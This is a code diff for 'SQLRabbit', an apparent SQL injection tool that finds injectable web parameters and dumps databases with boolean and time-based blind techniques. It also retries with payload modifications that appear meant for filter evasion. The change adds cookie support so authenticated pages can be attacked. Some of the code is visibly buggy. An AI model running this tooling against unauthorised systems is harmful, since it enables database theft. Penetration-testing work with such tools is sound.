@@ -53,9 +53,9 @@ def displayInfo(info):
         print ('-' * (20 * len((list(rows[0].keys()))) + 30))
 
 # Boolean-Based (SQLANDing)
-def booleanBasedSQLANDing(url, paramValues, vulnParam, sQLAndingPayload, trueFalsePayloads, d, tbl=None, clm=None):
+def booleanBasedSQLANDing(url, paramValues, vulnParam, sQLAndingPayload, trueFalsePayloads, d, tbl=None, clm=None, cookies=None):
     print (Fore.YELLOW + "[*] Dumping Database with Boolean-Based Technique" + Fore.RESET)
-    r, info = extractSQLAndingMain(url, paramValues, vulnParam, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm)
+    r, info = extractSQLAndingMain(url, paramValues, vulnParam, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm, cookies=cookies)
     if r:
         displayInfo(info)
         return True
@@ -63,8 +63,8 @@ def booleanBasedSQLANDing(url, paramValues, vulnParam, sQLAndingPayload, trueFal
         success = False
         for func in modify.modifyFunctions:
             mFunc = getattr(modify, func)
-            print (Fore.YELLOW + f"[*] Starting modification: {func}" + Fore.RESET)
-            r2, info = extractSQLAndingMain(url, paramValues, vulnParam, mFunc(sQLAndingPayload), mFunc(trueFalsePayloads), d, tbl=tbl, clm=clm)
+            print (Fore.WHITE + f"[*] Starting modification: {func}" + Fore.RESET)
+            r2, info = extractSQLAndingMain(url, paramValues, vulnParam, mFunc(sQLAndingPayload), mFunc(trueFalsePayloads), d, tbl=tbl, clm=clm, cookies=cookies)
             if r2:
                 print (Fore.GREEN + f"[+] Vulnerability Found with modification: {func} in {vulnParam} parameter" + Fore.RESET)
                 displayInfo(info)
@@ -75,7 +75,7 @@ def booleanBasedSQLANDing(url, paramValues, vulnParam, sQLAndingPayload, trueFal
             return False
 
 # Non-Boolean-Based (Optimised SQLANDing)
-def nonBooleanBasedOptimisedSQLANDing(url, paramValues, vulnParam, payload1, payload2, payload3, d, tbl=None, clm=None):
+def nonBooleanBasedOptimisedSQLANDing(url, paramValues, vulnParam, payload1, payload2, payload3, d, tbl=None, clm=None, cookies=None):
     print (Fore.YELLOW + "[*] Dumping Database with NonBoolean-Based Technique" + Fore.RESET)
     t1 = paramValues.copy()
     t2 = paramValues.copy()
@@ -98,7 +98,7 @@ def nonBooleanBasedOptimisedSQLANDing(url, paramValues, vulnParam, payload1, pay
     rT5 = sendReq(url, data=t5, allow_redirects=False) if d else sendReq(url, params=t5, allow_redirects=False)
     rT6 = sendReq(url, data=t6, allow_redirects=False) if d else sendReq(url, params=t6, allow_redirects=False)
     rT7 = sendReq(url, data=t7, allow_redirects=False) if d else sendReq(url, params=t7, allow_redirects=False)
-    r, info = extractLightspeedMain(url, paramValues, vulnParam, payload1, payload2, payload3, rT1, rT2, rT3, rT4, rT5, rT6, rT7, d, tbl=tbl, clm=clm)
+    r, info = extractLightspeedMain(url, paramValues, vulnParam, payload1, payload2, payload3, rT1, rT2, rT3, rT4, rT5, rT6, rT7, d, tbl=tbl, clm=clm, cookies=cookies)
     if r:
         displayInfo(info)
         return True
@@ -106,8 +106,8 @@ def nonBooleanBasedOptimisedSQLANDing(url, paramValues, vulnParam, payload1, pay
         success = False
         for func in modify.modifyFunctions:
             mFunc = getattr(modify, func)
-            print (Fore.YELLOW + f"[*] Starting modification: {func}" + Fore.RESET)
-            r2, info = extractLightspeedMain(url, paramValues, vulnParam, mFunc(payload1), mFunc(payload2), mFunc(payload3), rT1, rT2, rT3, rT4, rT5, rT6, rT7, d, tbl=tbl, clm=clm)
+            print (Fore.WHITE + f"[*] Starting modification: {func}" + Fore.RESET)
+            r2, info = extractLightspeedMain(url, paramValues, vulnParam, mFunc(payload1), mFunc(payload2), mFunc(payload3), rT1, rT2, rT3, rT4, rT5, rT6, rT7, d, tbl=tbl, clm=clm, cookies=cookies)
             if r2:
                 print (Fore.GREEN + f"[+] Vulnerability Found with modification: {func} in {vulnParams} parameter" + Fore.RESET)
                 displayInfo(info)
@@ -117,9 +117,9 @@ def nonBooleanBasedOptimisedSQLANDing(url, paramValues, vulnParam, payload1, pay
             print (Fore.RED + "[-] NonBoolean-Based Technique Failed" + Fore.RESET)
             return False
 
-def extractTimeBased(url, paramValues, vulnParam, payload, d, tbl=None, clm=None):
+def extractTimeBased(url, paramValues, vulnParam, payload, d, tbl=None, clm=None, cookies=None):
     print (Fore.YELLOW + "[*] Dumping Database with Time-Based Technique" + Fore.RESET)
-    r, info = extractTimeMain(url, paramValues, vulnParam, payload, d, tbl=tbl, clm=clm)
+    r, info = extractTimeMain(url, paramValues, vulnParam, payload, d, tbl=tbl, clm=clm, cookies=cookies)
     if r:
         displayInfo(info)
         return True
@@ -127,8 +127,8 @@ def extractTimeBased(url, paramValues, vulnParam, payload, d, tbl=None, clm=None
         success = False
         for func in modify.modifyFunctions:
             mFunc = getattr(modify, func)
-            print (Fore.YELLOW + f"[*] Starting modification: {func}" + Fore.RESET)
-            r2, info = extractTimeMain(url, paramValues, vulnParam, payload, d, tbl=tbl, clm=clm)
+            print (Fore.WHITE + f"[*] Starting modification: {func}" + Fore.RESET)
+            r2, info = extractTimeMain(url, paramValues, vulnParam, payload, d, tbl=tbl, clm=clm, cookies=cookies)
             if r2:
                 print (Fore.GREEN + f"[+] Vulnerability Found with modification: {func} in {vulnParam} parameter" + Fore.RESET)
                 displayInfo(info)
@@ -139,9 +139,9 @@ def extractTimeBased(url, paramValues, vulnParam, payload, d, tbl=None, clm=None
             return False
 
 
-def findVuln(url, paramValues, payload, trueFalsePayloads, d):
+def findVuln(url, paramValues, payload, trueFalsePayloads, d, cookies=None):
     print (Fore.YELLOW + "[*] Finding Vulnerable Points..." + Fore.RESET)
-    r1, params, vulnPoint = identifyMySQLBoolean(url, paramValues, payload, trueFalsePayloads, d)
+    r1, params, vulnPoint = identifyMySQLBoolean(url, paramValues, payload, trueFalsePayloads, d, cookies=cookies)
     if r1:
         print (Fore.GREEN + f"[+] Potential Vulnerability Found in {vulnPoint} parameter" + Fore.RESET)
         return True, params, vulnPoint
@@ -149,8 +149,8 @@ def findVuln(url, paramValues, payload, trueFalsePayloads, d):
         success = False
         for func in modify.modifyFunctions:
             mFunc = getattr(modify, func)
-            print (Fore.YELLOW + f"[*] Starting modification: {func}" + Fore.RESET)
-            r2, params, vulnPoint = identifyMySQLBoolean(url, paramValues, mFunc(payload), trueFalsePayloads, d)
+            print (Fore.WHITE + f"[*] Starting modification: {func}" + Fore.RESET)
+            r2, params, vulnPoint = identifyMySQLBoolean(url, paramValues, mFunc(payload), trueFalsePayloads, d, cookies=cookies)
             if r2:
                 print (Fore.GREEN + f"[+] Vulnerability Found with modification: {func} in {vulnPoint} parameter" + Fore.RESET)
                 return True, params, vulnPoint
@@ -158,9 +158,9 @@ def findVuln(url, paramValues, payload, trueFalsePayloads, d):
             print (Fore.RED + "[-] Cound not find vulnerable point" + Fore.RESET)
             return False
 
-def findTime(url, paramValues, payload, d):
+def findTime(url, paramValues, payload, d, cookies=None):
     print (Fore.YELLOW + "[*] Finding Vulnerable Points..." + Fore.RESET)
-    r1, params, vulnPoint = identifyMySQLTime(url, paramValues, payload, d)
+    r1, params, vulnPoint = identifyMySQLTime(url, paramValues, payload, d, cookies=cookies)
     if r1:
         print (Fore.GREEN + f"[+] Potential Vulnerability Found in {vulnPoint} parameter" + Fore.RESET)
         return True, params, vulnPoint
@@ -168,8 +168,8 @@ def findTime(url, paramValues, payload, d):
         success = False
         for func in modify.modifyFunctions:
             mFunc = getattr(modify, func)
-            print (Fore.YELLOW + f"[*] Starting modification: {func}" + Fore.RESET)
-            r2, params, vulnPoint = identifyMySQLTime(url, paramValues, mFunc(payload), d)
+            print (Fore.WHITE + f"[*] Starting modification: {func}" + Fore.RESET)
+            r2, params, vulnPoint = identifyMySQLTime(url, paramValues, mFunc(payload), d, cookies=cookies)
             if r2:
                 print (Fore.GREEN + f"[+] Vulnerability Found with modification: {func} in {vulnPoint} parameter" + Fore.RESET)
                 return True, params, vulnPoint
@@ -181,6 +181,7 @@ def booleanBased(args):
         url = args.url
         tbl = args.table
         clm = args.column.split(',') if args.column else None
+        cookies = args.cookies
 
         # GET Req
         if not args.data:
@@ -188,17 +189,17 @@ def booleanBased(args):
             if '*' in url:
                 url, paramValues, vulnParam = getSpecialURL(url)
                 if args.speed:
-                    return True if nonBooleanBasedOptimisedSQLANDing(url, paramValues, vulnParam, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, d, tbl=tbl, clm=clm) else False
+                    return True if nonBooleanBasedOptimisedSQLANDing(url, paramValues, vulnParam, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, d, tbl=tbl, clm=clm, cookies=cookies) else False
                 else:
-                    return True if booleanBasedSQLANDing(url, paramValues, vulnParam, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm) else False
+                    return True if booleanBasedSQLANDing(url, paramValues, vulnParam, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm, cookies=cookies) else False
             else:
                 url, paramValues = getURL(url)
-                tf, params, vulnPoint = findVuln(url, paramValues, fuzzGenericPayloads, trueFalsePayloads, d)
+                tf, params, vulnPoint = findVuln(url, paramValues, fuzzGenericPayloads, trueFalsePayloads, d, cookies=cookies)
                 if tf:
                     if args.speed:
-                        return True if nonBooleanBasedOptimisedSQLANDing(url, params, vulnPoint, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, d, tbl=tbl, clm=clm) else False
+                        return True if nonBooleanBasedOptimisedSQLANDing(url, params, vulnPoint, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, d, tbl=tbl, clm=clm, cookies=cookies) else False
                     else:
-                        return True if booleanBasedSQLANDing(url, params, vulnPoint, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm) else False
+                        return True if booleanBasedSQLANDing(url, params, vulnPoint, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm, cookies=cookies) else False
 
         # POST Req
         else:
@@ -207,33 +208,34 @@ def booleanBased(args):
             if '*' in data:
                 url, paramValues, vulnParam = getSpecialData(url, data)
                 if args.speed:
-                    return True if nonBooleanBasedOptimisedSQLANDing(url, paramValues, vulnParam, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, d, tbl=tbl, clm=clm) else False
+                    return True if nonBooleanBasedOptimisedSQLANDing(url, paramValues, vulnParam, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, d, tbl=tbl, clm=clm, cookies=cookies) else False
                 else:
-                    return True if booleanBasedSQLANDing(url, paramValues, vulnParam, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm) else False
+                    return True if booleanBasedSQLANDing(url, paramValues, vulnParam, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm, cookies=cookies) else False
             else:
                 url, paramValues = getData(url, data)
-                tf, params, vulnPoint = findVuln(url, paramValues, fuzzGenericPayloads, trueFalsePayloads, d)
+                tf, params, vulnPoint = findVuln(url, paramValues, fuzzGenericPayloads, trueFalsePayloads, d, cookies=cookies)
                 if tf:
                     if args.speed:
-                        return True if nonBooleanBasedOptimisedSQLANDing(url, params, vulnPoint, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, d, tbl=tbl, clm=clm) else False
+                        return True if nonBooleanBasedOptimisedSQLANDing(url, params, vulnPoint, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, d, tbl=tbl, clm=clm, cookies=cookies) else False
                     else:
-                        return True if booleanBasedSQLANDing(url, params, vulnPoint, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm) else False
+                        return True if booleanBasedSQLANDing(url, params, vulnPoint, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm, cookies=cookies) else False
 
 def timeBased(args):
     url = args.url
     tbl = args.table
     clm = args.column.split(',') if args.column else None
+    cookies = args.cookies
     # GET Req
     if not args.data:
         d = False
         if '*' in url:
             url, paramValues, vulnParam = getSpecialURL(url)
-            return True if extractTimeBased(url, paramValues, vulnParam, sqlTimePayload, d, tbl=tbl, clm=clm) else False
+            return True if extractTimeBased(url, paramValues, vulnParam, sqlTimePayload, d, tbl=tbl, clm=clm, cookies=cookies) else False
         else:
             url, paramValues = getURL(url)
-            tf, params, vulnPoint = findTime(url, paramValues, fuzzTimePayloads, d)
+            tf, params, vulnPoint = findTime(url, paramValues, fuzzTimePayloads, d, cookies=cookies)
             if tf:
-                return True if extractTimeBased(url, params, vulnPoint, sqlTimePayload, d, tbl=tbl, clm=clm) else False
+                return True if extractTimeBased(url, params, vulnPoint, sqlTimePayload, d, tbl=tbl, clm=clm, cookies=cookies) else False
 
     # POST Req
     else:
@@ -241,17 +243,18 @@ def timeBased(args):
         d = True
         if '*' in data:
             url, paramValues, vulnParam = getSpecialData(url, data)
-            return True if extractTimeBased(url, paramValues, vulnParam, sqlTimePayload, d, tbl=tbl, clm=clm) else False
+            return True if extractTimeBased(url, paramValues, vulnParam, sqlTimePayload, d, tbl=tbl, clm=clm, cookies=cookies) else False
         else:
             url, paramValues = getData(url, data)
-            tf, params, vulnPoint = findTime(url, paramValues, fuzzTimePayloads, d)
+            tf, params, vulnPoint = findTime(url, paramValues, fuzzTimePayloads, d, cookies=cookies)
             if tf:
-                return True if extractTimeBased(url, params, vulnPoint, sqlTimePayload, d, tbl=tbl, clm=clm) else False
+                return True if extractTimeBased(url, params, vulnPoint, sqlTimePayload, d, tbl=tbl, clm=clm, cookies=cookies) else False
 
 # Get the arguments
 parser = argparse.ArgumentParser(description='SQLRabbit menu')
 parser.add_argument('--url', help='The base URL')
 parser.add_argument('--data', help='Invoke Post Request')
+parser.add_argument('--cookies', help='Add Cookies')
 parser.add_argument('--technique', help='Specify Technique (B, T)')
 parser.add_argument('--speed', help='Run Optimised SQLANDing algorithm (Only works with ?id=1 to ?id=7)')
 parser.add_argument('--table', help='Specify Table name')
